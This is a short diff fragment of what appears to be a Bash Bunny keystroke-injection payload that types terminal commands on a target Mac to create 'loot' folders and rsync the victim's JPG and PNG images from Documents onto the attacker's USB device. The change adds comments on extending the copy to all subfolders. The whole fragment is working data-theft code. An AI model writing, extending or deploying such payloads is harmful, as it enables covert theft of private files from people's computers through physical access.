@@ -37,6 +37,8 @@ QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Pictures;
 QUACK ENTER
 QUACK STRING mkdir -p /Volumes/BashBunny/$lootdir/Downloads;
 QUACK ENTER
+# For look for images in all subfolders in the directory add '/**' before the directory name (Documents/**/...)
+# This considerably increases the execution time of the payload if the target has many images
 QUACK STRING rsync -av Documents/*.{jpg,jpeg,png} /Volumes/BashBunny/$lootdir/Documents ;
 QUACK ENTER
 QUACK STRING echo "Please wait while the files are copied...";
